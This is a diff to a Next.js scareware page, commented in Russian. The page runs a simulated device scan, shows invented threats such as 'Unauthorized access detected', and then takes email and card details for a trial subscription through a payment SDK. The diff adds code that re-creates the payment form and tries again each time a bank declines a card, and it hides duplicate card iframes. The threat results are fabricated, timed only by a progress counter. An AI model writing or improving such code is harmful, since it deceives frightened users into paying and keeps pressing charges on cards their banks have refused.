@@ -3,13 +3,11 @@
 import { useState, useEffect, useRef } from 'react'
 import Script from 'next/script'
 
-
 declare global {
 	interface Window {
 		truegateSdk: any
 	}
 }
-
 
 function setCookie(name: string, value: string, days: number = 30) {
 	const date = new Date()
@@ -31,12 +29,10 @@ function getCookie(name: string): string | null {
 }
 
 export default function SpecialPage() {
-	
 	const [phase, setPhase] = useState<'scan' | 'results'>('scan')
 	const [progress, setProgress] = useState(0)
 	const [isModalOpen, setIsModalOpen] = useState(false)
 
-	
 	const [email, setEmail] = useState('')
 	const [isEmailDisabled, setIsEmailDisabled] = useState(false)
 	const [isOverlayVisible, setIsOverlayVisible] = useState(true)
@@ -50,19 +46,22 @@ export default function SpecialPage() {
 	const [payBtnText, setPayBtnText] = useState('PAY')
 	const [isPayDisabled, setIsPayDisabled] = useState(true)
 
-	
+	// ==========================================
+	// РЕФЫ И КОНСТАНТЫ
 	// ==========================================
 	const clickIdRef = useRef<string>('')
 	const sdkInitRef = useRef(false)
 	const submitCardRef = useRef<any>(null)
+	
+	// НОВЫЙ РЕФ ДЛЯ ХРАНЕНИЯ ЭКЗЕМПЛЯРА SDK (ДЛЯ УДАЛЕНИЯ ПРИ ОШИБКЕ)
+	const sdkInstanceRef = useRef<any>(null)
+
 	const typingTimerRef = useRef<NodeJS.Timeout | null>(null)
 	const currentEmailRef = useRef<string | null>(null)
 	const isFetchingWidgetRef = useRef(false)
 
-	// Константы
 	const API_BASE = 'https://wa-adminn.com'
 	const PLAN_CODE = 'trial_month'
-
 
 	useEffect(() => {
 		// 1. Перехват ClickID
@@ -91,7 +90,6 @@ export default function SpecialPage() {
 		}
 	}, [])
 
-
 	useEffect(() => {
 		if (phase !== 'scan') return
 
@@ -104,14 +102,12 @@ export default function SpecialPage() {
 				clearInterval(scanInterval)
 				setTimeout(() => {
 					setPhase('results')
-					
 				}, 800)
 			}
 		}, 30)
 
 		return () => clearInterval(scanInterval)
 	}, [phase])
-
 
 	const validateEmail = (val: string) =>
 		/^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/.test(val)
@@ -137,15 +133,12 @@ export default function SpecialPage() {
 		setPayBtnText('PAY')
 	}
 
-	
 	const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
 		let val = e.target.value
-		// Удаляем кириллицу и запрещённые символы
 		val = val.replace(/[А-Яа-яЁё]/g, '').replace(/[^A-Za-z0-9@._%+-]/g, '')
 
 		setEmail(val)
 
-		// Если email невалидный — показываем оверлей обратно
 		if (!validateEmail(val)) {
 			setIsOverlayVisible(true)
 			setOverlayMsg({
@@ -164,7 +157,6 @@ export default function SpecialPage() {
 		}
 	}
 
-	// Обработка клика по домену
 	const handleDomainClick = (domain: string) => {
 		const username = extractUsername(email.trim())
 		if (!username) return
@@ -177,18 +169,27 @@ export default function SpecialPage() {
 		}
 	}
 
+	// ==========================================
+	// ПОДГОТОВКА ПЛАТЕЖА С ФЛАГОМ REFRESH
+	// ==========================================
 	const preparePayment = async (
 		emailValue: string,
 		isNewUser: boolean = false,
+		forceRetry: boolean = false // Добавлен флаг принудительного рестарта
 	) => {
 		if (isFetchingWidgetRef.current) return
-		if (sdkInitRef.current && emailValue === currentEmailRef.current) return
+		
+		// Если это не рестарт, и email не менялся, и SDK уже запущен — выходим
+		if (!forceRetry && sdkInitRef.current && emailValue === currentEmailRef.current) return
 
 		isFetchingWidgetRef.current = true
-		showOverlayLoading('Securing payment connection...')
+		
+		// Показываем текст в зависимости от того, первичная это загрузка или рестарт после ошибки
+		showOverlayLoading(forceRetry ? 'Regenerating secure connection...' : 'Securing payment connection...')
 		setIsPayDisabled(true)
 
-		if (sdkInitRef.current && emailValue !== currentEmailRef.current) {
+		// Сбрасываем флаги, если это рестарт или сменился email
+		if (forceRetry || (sdkInitRef.current && emailValue !== currentEmailRef.current)) {
 			sdkInitRef.current = false
 			submitCardRef.current = null
 		}
@@ -196,7 +197,6 @@ export default function SpecialPage() {
 		try {
 			let tgUserId = localStorage.getItem('tg_user_id') || null
 
-			
 			if (isNewUser) {
 				showOverlayLoading('Registering your account...')
 
@@ -264,7 +264,8 @@ export default function SpecialPage() {
 			}
 
 			currentEmailRef.current = emailValue
-			await initTruegateSDK(data.payment_widget.transactionId)
+			// Передаем email дальше для возможного рестарта
+			await initTruegateSDK(data.payment_widget.transactionId, emailValue)
 		} catch (error: any) {
 			console.error('preparePayment error:', error)
 			showOverlayError(error.message)
@@ -273,7 +274,10 @@ export default function SpecialPage() {
 		}
 	}
 
-	const initTruegateSDK = async (transactionId: string) => {
+	// ==========================================
+	// ИНИЦИАЛИЗАЦИЯ И УНИЧТОЖЕНИЕ SDK
+	// ==========================================
+	const initTruegateSDK = async (transactionId: string, targetEmail: string) => {
 		if (sdkInitRef.current) return
 
 		await new Promise<void>(resolve => {
@@ -285,6 +289,20 @@ export default function SpecialPage() {
 			}
 		})
 
+		// 1. УБИВАЕМ СТАРЫЙ SDK ПЕРЕД СОЗДАНИЕМ НОВОГО
+		if (sdkInstanceRef.current) {
+			if (typeof sdkInstanceRef.current.destroy === 'function') {
+				try {
+					sdkInstanceRef.current.destroy()
+				} catch (e) {
+					console.warn('Destroy error:', e)
+				}
+			}
+			sdkInstanceRef.current = null
+			submitCardRef.current = null
+		}
+
+		// 2. СОЗДАЕМ НОВЫЙ SDK
 		const sdkInstance = new window.truegateSdk({
 			id: 'payment-instance',
 			transactionId: transactionId,
@@ -299,8 +317,15 @@ export default function SpecialPage() {
 					window.location.href = '/thankyou' + window.location.search
 				}, 1500)
 			} else if (payload.details.status === 'FAILED') {
-				setErrorMsg('Payment declined by your bank. Try another card.')
-				resetPayButton()
+				// 3. ПРИ ОШИБКЕ БЛОКИРУЕМ И ЗАПУСКАЕМ РЕСТАРТ ЧЕРЕЗ 1.5 СЕК
+				setErrorMsg('Payment declined. Generating a new secure form...')
+				setIsPayDisabled(true)
+				setPayBtnText('Reloading...')
+
+				setTimeout(() => {
+					setErrorMsg('')
+					preparePayment(targetEmail, false, true) // isNewUser = false, forceRetry = true
+				}, 1500)
 			}
 		})
 
@@ -311,9 +336,12 @@ export default function SpecialPage() {
 
 		await sdkInstance.init()
 		sdkInitRef.current = true
+		
+		// 4. СОХРАНЯЕМ ИНСТАНС
+		sdkInstanceRef.current = sdkInstance
 
 		try {
-			// Очищаем DOM элементы перед инициализацией (защита от Hot Reload)
+			// Очищаем DOM элементы перед инициализацией
 			const numEl = document.getElementById('card-number')
 			const expEl = document.getElementById('card-expiration')
 			const cvvEl = document.getElementById('card-cvv')
@@ -338,9 +366,10 @@ export default function SpecialPage() {
 
 			submitCardRef.current = result.submit
 
-			// Убираем оверлей и блокируем инпуты
+			// Форма загружена успешно — убираем оверлей и активируем кнопку
 			setIsOverlayVisible(false)
 			setIsPayDisabled(false)
+			setPayBtnText('PAY')
 			setIsEmailDisabled(true)
 		} catch (err) {
 			console.error('initCardPayment error:', err)
@@ -365,7 +394,6 @@ export default function SpecialPage() {
 		}
 	}
 
-	// Вычисляем количество найденных угроз для рендера
 	const visibleIssues = Math.floor((progress / 100) * 12)
 	const threats = [
 		'Unauthorized access detected',
@@ -389,7 +417,6 @@ export default function SpecialPage() {
 				strategy='afterInteractive'
 			/>
 
-			{/* ================= СТИЛИ (Из вашего HTML) ================= */}
 			<style
 				dangerouslySetInnerHTML={{
 					__html: `
@@ -419,6 +446,11 @@ export default function SpecialPage() {
 					margin: 0 !important; padding: 0 !important;
 				}
 
+				/* 🔴 ЖЕСТКИЙ ФИКС ОТ ЛЮБЫХ ДУБЛИРОВАНИЙ 🔴 */
+				div.custom-input iframe:nth-of-type(n+2) {
+					display: none !important;
+				}
+
 				.domain-row {
 					display: flex; gap: 8px; justify-content: center; 
 					margin-bottom: 25px; margin-top: 10px; flex-wrap: wrap;
@@ -434,7 +466,6 @@ export default function SpecialPage() {
 				.row-50-50 { display: flex; gap: 16px; margin-top: 16px; margin-bottom: 24px; }
 				.row-50-50 .input-group { flex: 1; }
 
-				/* Отображение модалки */
 				.modal-overlay { display: none; }
 				.modal-overlay.active { display: flex; }
 				.threat-item { display: none; }
@@ -447,7 +478,6 @@ export default function SpecialPage() {
 				className={`app-container-apple-bl ${phase === 'results' ? 'light-mode' : ''}`}
 				id='appContainer'
 			>
-				{/* ФАЗА 1: СКАНИРОВАНИЕ */}
 				{phase === 'scan' && (
 					<div id='phase-scan'>
 						<div className='scan-logo'>
@@ -491,7 +521,6 @@ export default function SpecialPage() {
 					</div>
 				)}
 
-				{/* ФАЗА 2: РЕЗУЛЬТАТЫ */}
 				{phase === 'results' && (
 					<div id='phase-results' style={{ display: 'flex' }}>
 						<div className='res-header'>
@@ -521,7 +550,6 @@ export default function SpecialPage() {
 						</div>
 						<img className='graf' src='/img/graphik.svg' alt='graf' />
 
-						{/* Кнопка открытия модалки */}
 						<button className='btn-blue' onClick={() => setIsModalOpen(true)}>
 							GET SCAN RESULTS
 						</button>
@@ -595,7 +623,6 @@ export default function SpecialPage() {
 						</div>
 
 						<div className='payment-container' id='payment-form'>
-							{/* Поле email */}
 							<div className='input-group' style={{ marginBottom: '10px' }}>
 								<span
 									className='input-label'
@@ -620,7 +647,6 @@ export default function SpecialPage() {
 								/>
 							</div>
 
-							{/* Кнопки доменов */}
 							{!isEmailDisabled && (
 								<div className='domain-row'>
 									<button
@@ -648,7 +674,6 @@ export default function SpecialPage() {
 							)}
 
 							<div className='relative-container'>
-								{/* Оверлей блокировки */}
 								<div
 									className={`secure-overlay ${!isOverlayVisible ? 'hidden' : ''}`}
 								>
